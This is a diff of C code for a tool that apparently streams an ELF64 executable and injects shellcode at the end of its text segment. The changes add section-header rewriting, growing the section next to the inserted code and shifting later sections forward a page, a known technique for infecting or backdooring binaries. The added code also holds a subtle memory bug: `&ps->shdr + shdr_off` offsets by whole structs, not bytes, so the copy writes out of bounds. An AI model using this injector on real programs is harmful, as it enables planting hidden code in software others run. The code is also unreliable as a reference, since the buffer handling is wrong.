@@ -16,9 +16,7 @@
 // TODO: make the write calls more robust by accepting partial writes and re-trying the writes in those cases
 // TODO: make this code compile without warnings
 
-// TODO: fully implement the section stripping mode and the section preserving mode
-  // TODO: extend the size of the last section in the text segment
-  // TODO: move the start of sections that are after the break forward by a page
+// TODO: a bit off topic, but think about how to solve the general problem of editing things while streaming with a nice declarative abstraction
 
 static long long page_size = 0x1000;
 static unsigned shell_size;
@@ -69,14 +67,22 @@ static unsigned char *read_whole_file(const char *file_name, unsigned s) {
      _a < _b ? _a : _b; })
 
 typedef struct {
-  Elf64_External_Ehdr ehdr;
-  Elf64_External_Phdr *phdr;
-  int read_bytes;
-  long long phdr_offset;
-  short phdr_num;
-  long long text_end;
-  long long segment_data_end;
-  int preserve_sections;
+  Elf64_External_Ehdr ehdr; // the ehdr
+  Elf64_External_Phdr *phdr; // we can't process only one phdr at a time, so we read the whole table into this first
+  Elf64_External_Shdr shdr; // the current shdr being edited
+
+  int read_bytes; // the bytes read so far
+
+  long long shdr_offset; // the location of the shdr
+  short shdr_num; // the number of shdr entries
+
+  long long phdr_offset; // the location of the phdr
+  short phdr_num; // the number of phdr entries
+
+  long long text_end; // the end of the text segment. This is the location where we insert the shell code
+  long long segment_data_end; // the end of the segment data. Anything beyond the point is stripped if we want to strip sections
+
+  int preserve_sections; // preserve sections if this is not 0
 } processing_state;
 
 // returns the number of bytes consumed, 0 on end of stream and negative on error
@@ -95,11 +101,13 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
 
     // header end condition
     if (ps->read_bytes + consumed_bytes == sizeof(ps->ehdr)) {
-      // 1. (optional) extract the location of phdr
+      // 1. extract the location of phdr and shdr
       memcpy(&ps->phdr_offset, ps->ehdr.e_phoff, sizeof(ps->ehdr.e_phoff));
+      memcpy(&ps->shdr_offset, ps->ehdr.e_shoff, sizeof(ps->ehdr.e_shoff));
 
-      // 2. extract the size of phdr
+      // 2. extract the size of phdr and shdr
       memcpy(&ps->phdr_num, ps->ehdr.e_phnum, sizeof(ps->ehdr.e_phnum));
+      memcpy(&ps->shdr_num, ps->ehdr.e_shnum, sizeof(ps->ehdr.e_shnum));
 
       // 3. zero out the section pointers (or move them forward a page)
       if (ps->preserve_sections == 0) {
@@ -241,11 +249,64 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
         } else {
           consumed_bytes = len;
         }
+        if (write(out_fd, buff, consumed_bytes) != consumed_bytes) {
+          return -7;
+        }
       } else {
-        consumed_bytes = len;
-      }
-      if (write(out_fd, buff, consumed_bytes) != consumed_bytes) {
-        return -6;
+        // we are preserving sections
+        // check if we are not already done with shdr
+        if (ps->read_bytes < ps->shdr_offset + ps->shdr_num * sizeof(Elf64_External_Shdr)) {
+          // check if we are before the shdr section. In that case just read up to as close to the shdr section as possible
+          if (ps->read_bytes < ps->shdr_offset) {
+            consumed_bytes = min(ps->shdr_offset - ps->read_bytes, len);
+            if (write(out_fd, buff, consumed_bytes) != consumed_bytes) {
+              return -8;
+            }
+          } else {
+            // we are at least on the 1st byte of the shdr table and not past the end yet
+
+            // find out which shdr we are on and how far into it
+            long long shdr_global_off = ps->read_bytes - ps->shdr_offset;
+            //long long shdr_idx = shdr_global_off / sizeof(Elf64_External_Shdr);
+            long long shdr_off = shdr_global_off % sizeof(Elf64_External_Shdr);
+
+            // if we can read the whole rest of the current shdr, read it in, modify it and spit it out
+            if (shdr_off + len >= sizeof(Elf64_External_Shdr)) {
+              fprintf(stderr, "We can read the whole thing\n");
+              consumed_bytes = sizeof(Elf64_External_Shdr) - shdr_off;
+              memcpy(&ps->shdr + shdr_off, buff, consumed_bytes);
+              // we have a whole shdr at this point
+              long long data_offset, data_size;
+              memcpy(&data_offset, ps->shdr.sh_offset, sizeof(ps->shdr.sh_offset));
+              memcpy(&data_size, ps->shdr.sh_size, sizeof(ps->shdr.sh_size));
+              // the section needs to be expanded to include the entry point
+              if (data_offset + data_size == ps->text_end) {
+                data_size += shell_size;
+                memcpy(ps->shdr.sh_size, &data_size, sizeof(ps->shdr.sh_size));
+              } else if (data_offset > ps->text_end) {
+                // the section is after the inserted space, so we have to move it forward a page
+                data_offset += page_size;
+                memcpy(ps->shdr.sh_offset, &data_offset, sizeof(ps->shdr.sh_offset));
+              }
+              if (write(out_fd, &ps->shdr, sizeof(Elf64_External_Shdr)) != sizeof(Elf64_External_Shdr)) {
+                return -9;
+              }
+            }
+
+            // otherwise read as much as we can and continue
+            else {
+              fprintf(stderr, "We can NOT read the whole thing\n");
+              consumed_bytes = len;
+              memcpy(&ps->shdr + shdr_off, buff, len);
+            }
+          }
+        } else {
+          fprintf(stderr, "after end\n");
+          consumed_bytes = len;
+          if (write(out_fd, buff, len) != len) {
+            return -10;
+          }
+        }
       }
     } else {
       // we are done!
